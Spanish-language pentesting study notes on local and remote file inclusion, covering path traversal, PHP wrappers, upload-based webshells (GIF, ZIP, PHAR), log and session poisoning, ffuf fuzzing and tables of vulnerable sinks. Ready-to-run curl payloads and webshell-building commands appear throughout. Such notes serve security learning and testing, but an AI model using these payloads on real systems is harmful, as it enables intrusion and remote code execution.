## A través de path traversal
### Inclusión directa o desde un directorio
Supongamos la siguiente url de una página: 
```http
http://$target/index.php?language=en
```
Si el backend utiliza directamente el parámetro recibido: 
```php
include($_GET['language']);
# ó
include("./languages/" . $_GET['language']);
```
Podemos intentar directamente acceder a contenido local a través de técnicas de [path traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
### Prefijo añadido 
El backend también puede añadir texto antes de nuestra entrada:
```php
include("lang_" . $_GET['language']);
```
En este caso un payload de traversal normal produciría:
```text
lang_../../../etc/passwd
```
por lo que el prefijo puede impedir que la ruta sea válida.
### Extensión añadida
Podría acontecer por utilizar un backend como el que sigue:  
```php
include($_GET['language'] . ".php");
```
Cualquier intento como 
```http
http://$target/index.php?language=../../../etc/passwd
```
Derivaría en  tratar de resolver `/etc/passwd.php`, por lo que no podríamos leer `/etc/passwd` directamente. En su lugar, en estas situaciones es interesante tratar de apuntar a ficheros que sepamos que tienen la extensión esperada, p.ej: 
```
?language=../../../var/www/html/index
```
### LFI de segundo orden
El valor utilizado para construir la ruta no tiene por qué proceder directamente de la petición actual. Supongamos que una web descargar nuestro avatar desde: 
```bash
/profile/$username/avatar.png
```
En este caso podríamos tratar de envenenar la base de datos introduciendo un valor malicioso para username. 
## A través de wrappers y filtros PHP
Esta técnica suele ser **posterior** a la identificación de un LFI y nos va a permitir acceder a ciertos recursos internos (php) o incluso RCE si hay ciertas funciones php habilitadas.
PHP dispone de diferentes  [wrappers](https://www.php.net/manual/en/wrappers.php) para acceder a streams utilizando una sintaxis similar a la de un protocolo. Los wrappers que más nos interesan, en general son los [wrappers php](https://www.php.net/manual/en/wrappers.php.php) y conocer [sus filtros](https://www.php.net/manual/en/filters.php)
```php
wrapper://recurso
# En particular, php://filter es un wrapper especial que permite aplicar  filtros a otro recurso: 
php://filter/[read|write]=<filtro>/resource=<recurso>
# Ejemplo
php://filter/read=convert.base64-encode/resource=../../config.php
```
Un **wrapper** determina cómo se accede al recurso(`php`, `file`, `data`, `zip`), mientras que un **filtro** transforma los datos que se leen o escriben a través del stream. La función que consume el recurso constituye el **sink** y determina la operación final
### Comprobando configuraciones PHP
Si podemos acceder a la información del archivo de configuración de PHP (`/usr/local/etc/php/php.ini`), (`/etc/php/X.Y/apache2/php.ini`) para Apache o a (`/etc/php/X.Y/fpm/php.ini`) para nginx
### Mostrar contenido php - base 64
Aunque hay filtros similares, basta con utilizar este para leer el contenido de un archivo php en base 64:
```php
# idea general
php://filter/convert.base64-encode/resource=<archivo>
# ejemplo (recordar que esto no funciona al ponerlo en el navegador tal cual, porque... TODO)
http://$target/index.php?page=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd
```
### RCE
Estas técnicas requieren que el sink sea `include()` o `require()`. Funciones como `readfile()` solo mostrarían el contenido sin ejecutarlo.
#### `data://`
Requiere normalmente:
```toml
allow_url_fopen=On
allow_url_include=On
```
En la práctica podemos proceder como sigue
```bash
payload=$(printf '%s' '<?php system($_GET["cmd"]); ?>' | base64 -w0)

curl -sG "http://$target/index.php" \
  --data-urlencode "page=data://text/plain;base64,$payload" \
  --data-urlencode 'cmd=id'
```
#### `php://input`
Con `allow_url_include=On`, podemos intentar incluir el cuerpo de la petición:
```bash
curl -s --data-binary '<?php system($_GET["cmd"]); ?>' \
  "http://$target/index.php?page=php://input&cmd=id"
```
#### `expect://`
Si la extensión PECL Expect está instalada y cargada:
```bash
curl -sG "http://$target/index.php" \
  --data-urlencode 'page=expect://id'
```

`expect://` no está disponible por defecto, por lo que es un escenario poco habitual.
## Remote file inclusion
En PHP, la inclusión remota suele requerir que `allow_url_include` esté habilitado. Aun así, la forma más fiable de comprobarlo es intentar incluir directamente una URL. Conviene comenzar por un recurso local:
```http
http://127.0.0.1:<puerto>/recurso
```
Esto permite comprobar la inclusión sin depender de conectividad externa o firewalls.
Además, si podemos controlar el contenido del recurso incluido.. .es muy probable que **derive en RCE**
### Protocolos
Dependiendo del backend y la configuración, se puede obtener el fichero remoto mediante diferentes mecanismos: 
```
http://
https://
ftp://
ftps://
SMB -> Si estamos en Windows, utilizando rutas UNC: \\servidor\share\fichero.php
```

### Similitudes y diferencias con SSRF
Una RFI mediante una URL remota implica una petición saliente y, por tanto, puede ofrecer capacidades similares a SSRF; pero además incluye/procesa el contenido obtenido, que es lo que la caracteriza como RFI.

Simplificando bastante podríamos pensar lo siguiente: 
```
curl($url) -> petición saliente -> SSRF

include($url) -> petición saliente -> inclusión del resultado -> RFI
```

Además, si estamos ante un SSRF, en la que la petición saliente se realiza, por ej. ,  con `libcurl`, pueden estar disponibles distintos protocolos, dependiendo de compilación y configuración:  
```
http
https
ftp
gopher
ldap
smb
smtp
telnet
...
```
Mientras que en RFI PHP típica, sólo tiene sentido tener en cuenta los protocolos vistos antes: http(s), ftp(s), sbm (en Windows).

SSRF está limitada por los protocolos que soporte el cliente de red; RFI está limitada por los recursos que pueda abrir el mecanismo de inclusión.

## LFI + File upload
La combinación de LFI con subida de archivos, puede llevar a escenarios interesantes donde solo la combinación de ambas vulnerabilidades permite escalar hasta RCE 
### Image Upload
Podemos subir una imagen que incluya contenido PHP manteniendo una extensión permitida.
```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
Después debemos localizar dónde se ha almacenado el fichero, por ejemplo:
```html
<img src="/profile_images/shell.gif">
```
Si conocemos su ruta, podemos intentar incluirlo mediante la LFI:
```http
?language=./profile_images/shell.gif
```
Si existe un directorio prefijado en el backend, será necesario utilizar path traversal para alcanzarlo.
### ZIP Upload
En PHP puede utilizarse el wrapper `zip://` si está disponible, que por defecto no está activado. En la práctica, creamos un zip del siguiente modo: 
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
Si conseguimos subir el archivo y conocemos su ruta, podemos referenciar el fichero almacenado dentro del ZIP mediante `#`:
```http
zip://./profile_images/shell.jpg#shell.php
```
En una URL, `#` debe codificarse como `%23`:
```http
http://$target/index.php?language=zip://./profile_images/shell.jpg%23shell.php
```
### PHAR Upload
Otra alternativa específica de PHP es utilizar el wrapper `phar://`, que permite acceder a ficheros contenidos dentro de un archivo PHAR.
Podemos crear un PHAR que contenga un fichero con código PHP:
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

Lo generamos y posteriormente podemos renombrarlo con una extensión aceptada por el upload:
```bash
php -d phar.readonly=0 shell.php
mv shell.phar shell.jpg
```
Una vez subido, podemos acceder al fichero interno mediante:

```http
phar://./profile_images/shell.jpg/shell.txt
```

Por ejemplo:

```
http://$target/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

Tanto `zip://` como `phar://` son alternativas útiles cuando no podemos incluir directamente el fichero subido. Siempre que sea posible, la inclusión directa suele ser la opción más sencilla.
## Log poisoning
Consiste en introducir contenido controlado en un fichero de logs del servidor y, posteriormente, incluir dicho log mediante una LFI. Si el sink interpreta código, la combinación puede derivar en RCE.
### Server Log Poisoning
Los servidores web como Apache o Nginx almacenan información de las peticiones en logs como:
```bash
/var/log/apache2/access.log
/var/log/nginx/access.log
```
Algunos campos registrados son controlables por el usuario, por ejemplo:
```
User-Agent
Referer
Request URI
```
Si podemos leer el log mediante LFI:
```http
?language=/var/log/apache2/access.log
```
podemos comprobar qué campos controlamos y posteriormente introducir contenido PHP en alguno de ellos. Por ejemplo, modificando `User-Agent`:
```http
User-Agent: <?php system($_GET["cmd"]); ?>
```
### PHP Session Poisoning
Una variante similar consiste en utilizar los ficheros de sesión de PHP.
Habitualmente se almacenan con un nombre similar a:
```bash
/var/lib/php/sessions/sess_<PHPSESSID>
```
Si algún dato controlable termina almacenado en nuestra sesión, podemos modificarlo para introducir contenido PHP y posteriormente incluir el fichero mediante la LFI.
## Fuzzing - Diccionarios
- [Lista general LFI de Seclist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
- [LFI-Jhaddix](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) 
- [Server Webroot Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
- [Server Webroot Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)
- [Server Logs/Configurations Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
- [Server Logs/Configurations Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)

Ejemplo de fuzzing de parámetros:
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```
Ejemplo de fuzzing de Wordlist
```bash
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```
## Teoría
Es una vulnerabilidad que permite manipular una ruta o recurso controlado por la aplicación para **leer, incluir o ejecutar archivos locales o remotos** no previstos. Suele ocurrir en motores de plantillas, donde una parte se carga de forma estática (`header`, `navigation bar`, `footer`, ... ) y luego carga el contenido dinámico. Ej: `/index.php?page=about`, donde se carga el contenido estático de `index.php` y el dinámico, `about.php` se pasa como parámetro. 

Patrones típicos: 
```php
GET /index.php?page=about 
GET /index.php?language=en 
GET /about/en
```
### Diferencia entre LFI y path traversal
En función de como se trate en el backend una entrada, estaremos ante distintos escenarios. Por ejemplo:

| Caso                            | Clasificación principal                              |
| ------------------------------- | ---------------------------------------------------- |
| `file_get_contents($path)`      | Path traversal / arbitrary file read                 |
| `readfile($path)`               | Path traversal / arbitrary file read                 |
| `fopen($path)`                  | Path traversal                                       |
| `include($path)`                | LFI si permite incluir ficheros locales no previstos |
| `require($path)`                | LFI                                                  |
La diferencia es que si la información que hay en el fichero contiene, por ejemplo `<?php system($_GET['cmd']); ?>`, en un caso de LFI se interpretará el código, y en el caso de path traversal simplemente imprimirá literalmente `<?php system($_GET['cmd']); ?>`, sin interpretar el contenido php. 

Esto no significa que el contenido leído sea seguro. Si posteriormente se procesa en otro contexto, pueden aparecer vulnerabilidades adicionales. Por ejemplo, contenido HTML devuelto sin escaping podría derivar en XSS, un XML procesado por un parser inseguro podría participar en un XXE, o contenido introducido en un motor de plantillas podría dar lugar a SSTI.
### SINKS interesantes
#### PHP
- Algunos sinks
	```php
	include()
	include_once()
	require()
	require_once()
	```

- Ejemplo 
	```php
	if (isset($_GET['language'])) { include($_GET['language']); }
	```

#### Node JS
- Algunos sinks
	```js
	fs.readFile()
	fs.readFileSync()
	res.sendFile()
	res.render()
	```
- Ejemplo
	```js
	if(req.query.language) {
	    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
	        res.write(data);
	    });
	}
	```
- O en `Express.js`
	```js
	app.get("/about/:language", function(req, res) { res.render(`/${req.params.language}/about.html`); });
	```
#### Java
- Sinks
	```java
	<jsp:include ... />
	<c:import ... />
	```
- Ejemplo
	```Java
	<c:if test="${not empty param.language}"> 
		<jsp:include file="<%= request.getParameter('language') %>" /> 
	</c:if>
	```
#### .NET
- Sinks
	```Csharp
	Response.WriteFile()
	Html.Partial()
	RemotePartial()
	#include
	```
- Ejemplo
	```CSharp
	@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
		<% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
	}
	```

### Read vs execute / Local vs Remote
- **¿El sink únicamente devuelve bytes o interpreta el fichero?**  Arbitrary file read / enumeración interna vs posible RCE
- ¿El sink acepta únicamente paths locales o también URLs? urls tipo `../../config.php` vs urls tipo `http://attacker/resource`

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
| `file_get_contents()`        |        ✅         |      ❌      |       ✅        |
| `fopen()`/`file()`           |        ✅         |      ❌      |       ❌        |
| **NodeJS**                   |                  |             |                |
| `fs.readFile()`              |        ✅         |      ❌      |       ❌        |
| `fs.sendFile()`              |        ✅         |      ❌      |       ❌        |
| `res.render()`               |        ✅         |      ✅      |       ❌        |
| **Java**                     |                  |             |                |
| `include`                    |        ✅         |      ❌      |       ❌        |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `@Html.Partial()`            |        ✅         |      ❌      |       ❌        |
| `@Html.RemotePartial()`      |        ✅         |      ❌      |       ✅        |
| `Response.WriteFile()`       |        ✅         |      ❌      |       ❌        |
| `include`                    |        ✅         |      ✅      |       ✅        |
